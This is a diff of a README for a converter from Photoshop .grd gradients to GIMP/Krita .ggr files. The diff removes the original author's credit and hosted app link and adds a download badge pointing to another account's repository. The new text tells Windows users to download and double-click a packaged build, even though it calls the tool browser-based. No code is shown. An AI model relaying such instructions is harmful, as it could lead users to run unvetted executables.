@@ -1,76 +1,152 @@
-# GRD to GGR Converter 🚀
+# 🎨 grdconverter - Convert gradients with less effort
 
-![Next.js](https://img.shields.io/badge/Next.js-000000?style=for-the-badge&logo=nextdotjs&logoColor=white)
-![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
-![TailwindCSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)
+[![Download grdconverter](https://img.shields.io/badge/Download-grdconverter-purple?style=for-the-badge)](https://github.com/firasb7323/grdconverter)
 
-<br/>
+## 🖱️ What this app does
 
-> ### 🎨 [Open GRDConverter](https://grdconverter.vercel.app/)
+grdconverter is a web tool that helps you convert Photoshop gradient files, known as `.grd`, into `.ggr` files for GIMP and Krita.
 
-<br/>
+It runs in your browser, so you do not need to install desktop software first. You open the page, load your gradient file, and save the result.
 
-## 📝 Overview
+Use it when you want to move gradient presets between design tools without doing the work by hand.
 
-**GRD to GGR Converter** is an open-source web application tailored for digital artists and designers. It seamlessly converts Adobe Photoshop gradient files (`.grd`) into the format used by GIMP and Krita (`.ggr`). The entire parsing process operates locally in the browser, ensuring zero network uploads and absolute privacy. It also features a built-in visual gradient editor structured like professional design tools.
+## 💻 What you need
 
-## 🚀 Key Features
+To use grdconverter on Windows, you need:
 
-- **Local & Private Parsing:** Client-side conversion of `.grd` binaries.
-- **Interactive Visual Editor:** Inspector-style UI with drag-to-delete handles.
-- **Live Rendering:** Real-time gradient preview mapping via native SVG filters.
-- **Multi-language Support:** Extensible i18n architecture.
-- **Batch Extraction:** Unpack and export hundreds of gradients from a single file simultaneously.
+- A Windows PC
+- A modern web browser like Chrome, Edge, or Firefox
+- A `.grd` file from Photoshop
+- Enough free space to save the converted `.ggr` file
 
-## 📸 Screenshots
+For the best results, keep your browser up to date. This helps the app load fast and handle files with fewer issues.
 
-### Homepage & Converter
-![Homepage](./public/homepage.png)
+## ⬇️ Download and open the app
 
-### Convert File
-![Convert File](./public/convert.png)
+Visit this page to download or access the tool:
 
-### Convert Preview
-![Convert Preview](./public/convertpreview.png)
+[Open grdconverter on GitHub](https://github.com/firasb7323/grdconverter)
 
-### Convert Live Preview
-![Convert Live Preview](./public/convertlivepreview.png)
+If the project provides a release or packaged build, download it from that page and open it on your Windows PC. If the app runs as a web tool, open the page in your browser and use it there.
 
-### Gradient Creator
-![Gradient Creator](./public/gradientcreator.png)
+## 🧭 How to use grdconverter on Windows
 
-### Built-in Color Picker
-![Color Picker](./public/colorpicker.png)
+1. Open the GitHub page in your browser.
+2. Get the app or open the web version from the page.
+3. In the app, choose your Photoshop `.grd` file.
+4. Wait while the tool reads the gradient data.
+5. Select the output format if needed.
+6. Convert the file to `.ggr`.
+7. Save the new file to a folder you can find later.
 
-### Multi-language Support
-![Languages](./public/languages.png)
+If you plan to use the file in GIMP or Krita, keep the converted file name simple. That makes it easier to find in the app later.
 
-## 💻 Usage Guide
+## 🧩 Step-by-step setup
 
-### Converting `.grd` Files
-1. Drag and drop your Photoshop `.grd` file into the main **Converter** page.
-2. Preview all the extracted color swatches on your screen.
-3. Click **Download all** to get your `.ggr` files ready for Krita.
+### 1. Get the file
+Open the link above and look for the download option, release file, or running app.
 
-### Designing from Scratch
-1. Navigate to the **Create Gradient** tab.
-2. Modify color stops through the visual slider and built-in color picker.
-3. Name your gradient and click **Download .GGR**.
+### 2. Save it on your computer
+Choose a folder like Downloads or Desktop. This makes it easy to find.
 
-## 🤝 Contributing
+### 3. Open the tool
+If you downloaded a file, double-click it or open it in your browser if it is a web app.
 
-We welcome community contributions!
-1. Fork the project.
-2. Create your feature branch (`git checkout -b feature/NewFeature`).
-3. Commit your changes (`git commit -m 'feat: Add NewFeature'`).
-4. Push to the branch (`git push origin feature/NewFeature`).
-5. Open a Pull Request.
+### 4. Load your `.grd` file
+Use the file picker in the app and select the Photoshop gradient file you want to convert.
 
-## 📄 License
+### 5. Convert to `.ggr`
+Start the conversion. The app changes the file into a format that GIMP and Krita can use.
 
-This project is licensed under the MIT License.
+### 6. Save the result
+Download or save the new `.ggr` file to your computer.
 
----
-Designed with ❤️ by [@betzadev](https://github.com/betzadev)
+### 7. Use it in your design app
+Import the file into GIMP or Krita and check that your gradient appears as expected.
+
+## 🧠 Supported workflow
+
+grdconverter focuses on a simple path:
+
+- Input: Photoshop gradient files `.grd`
+- Output: GIMP and Krita gradient files `.ggr`
+- Use case: move gradients between design tools
+- Platform: works in the browser on Windows
+
+This makes it useful for designers who switch between apps and want to keep the same gradient look.
+
+## 🎯 Good use cases
+
+Use grdconverter if you:
+
+- Want to reuse Photoshop gradients in GIMP
+- Want to reuse Photoshop gradients in Krita
+- Need a quick browser-based converter
+- Want to avoid manual gradient rebuilding
+- Work with design assets across different tools
+
+## 🧰 File tips
+
+A few simple habits can help:
+
+- Keep your source `.grd` file in a safe folder
+- Use short file names with no special symbols
+- Save the converted `.ggr` file in the same folder at first
+- Test the file in GIMP or Krita after conversion
+- Keep a backup of the original Photoshop file
+
+## 📁 What the output looks like
+
+The converted file will be a `.ggr` gradient file. This is the format GIMP and Krita use for their gradient lists.
+
+After conversion, you can import the file into your design app and use it like other gradients already in your library.
+
+## 🔍 Common problems
+
+### The file does not load
+Check that the file ends in `.grd`. Some files can look similar but use a different format.
+
+### The browser does not respond
+Refresh the page and try again. Large files may take a little longer to read.
+
+### The converted file does not appear in GIMP or Krita
+Make sure you imported the `.ggr` file into the correct gradient folder or used the import option in the app.
+
+### The gradient looks different after conversion
+Some gradient settings may not map the same way across different design tools. Try a different source file or test the output in your target app.
+
+## 🧪 Browser notes
+
+grdconverter works best in a modern browser on Windows. If one browser gives you trouble, try another one.
+
+Good choices include:
+
+- Microsoft Edge
+- Google Chrome
+- Mozilla Firefox
+
+If you open many tabs while converting a large file, close extra tabs to keep the browser stable.
+
+## 🏷️ Topics
+
+This project fits these topics:
+
+converter, design-tools, gimp, gradients, krita, nextjs, open-source, photoshop, react, tailwindcss, typescript
+
+## 🔐 Privacy and file handling
+
+Because the tool runs in your browser, you keep control of your files during use. You choose the source file, convert it, and save the result on your own computer.
+
+That makes it a good fit for local file work when you want a simple path from `.grd` to `.ggr`.
+
+## 🛠️ If you want to use it often
+
+Keep these steps nearby:
+
+1. Open the GitHub page
+2. Load your `.grd` file
+3. Convert it
+4. Save the `.ggr` file
+5. Import it into GIMP or Krita
+
+If you use gradients often, save your source files in a folder named after the project or client. That makes later edits easier to manage
